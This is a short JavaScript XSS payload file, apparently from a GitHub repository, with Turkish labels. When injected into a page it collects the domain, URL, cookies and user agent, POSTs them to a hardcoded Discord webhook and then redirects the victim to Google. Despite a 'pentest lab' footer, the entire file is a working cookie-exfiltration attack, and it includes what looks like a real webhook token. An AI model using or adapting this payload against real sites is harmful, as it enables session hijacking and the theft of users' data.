// GitHub: s.js
const webhookURL = "https://discord.com/api/webhooks/1469278750876368947/evwkKVf6b9B0g50c-JVP0w3Zt3J00ZW6PiGcUfvUAlIrqHJ4C2DjnYMb3e1nHeYBYi0I";
alert("XSS Bot - Kaptan Pengu");
const data = {
    username: "XSS Bot - Kaptan Pengu",
    content: "🚀 **Yeni Veri Sızdırıldı!**",
    embeds: [{
        title: "Saldırı Detayları",
        color: 16711680, // Kırmızı
        fields: [
            { name: "Domain", value: document.domain, inline: true },
            { name: "Sayfa", value: location.href, inline: true },
            { name: "Çerezler (Cookies)", value: "```" + (document.cookie || "Yok/HttpOnly") + "```" },
            { name: "Kullanıcı Aracısı", value: navigator.userAgent }
        ],
        footer: { text: "CachyOS Pentest Lab" }
    }]
};

fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
});


window.location.href = "https://www.google.com";